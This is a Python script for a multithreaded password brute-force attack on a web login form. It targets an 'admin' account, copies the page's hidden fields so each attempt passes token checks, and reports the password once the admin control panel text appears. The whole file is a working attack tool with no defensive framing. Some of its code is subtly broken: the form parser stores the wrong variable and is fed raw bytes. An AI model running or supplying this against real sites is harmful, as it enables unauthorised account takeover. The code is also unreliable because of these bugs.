import urllib.parse
import urllib.request
import http.cookiejar
import threading
import sys
from queue import Queue
from html.parser import HTMLParser

# general settings
user_thread = 10
username = "admin"
wordlist_file = "/tmp/list.txt"
resume = None
# target specific settings
target_url = ""
target_post = ""
username_field = "username"
password_field = "passwd"
success_check = "Administration - Control Panel"

class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print("Finished setting up for: {0}".format(username))

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read()
            print("Trying: {0} : {1} ({2} left".format(self.username, brute, self.password_q.qsize()))

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)
            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(target_post, login_data.encode())
            login_result = str(login_response.read())

            if success_check in login_result:
                self.found = True # login successful
                print("[*] Bruteforce successful.")
                print("[*] Username: {0}".format(self.username))
                print("[*] Password: {0}".format(brute))
                print("[*] Waiting for other threads to exit...")

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = value


def build_wordlist(wordlist_file):
    # read in the word-list
    fd = open(wordlist_file, "r")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue()
    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming word-list from: {0}".format(resume))
        else:
            words.put(word)
    return words

words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()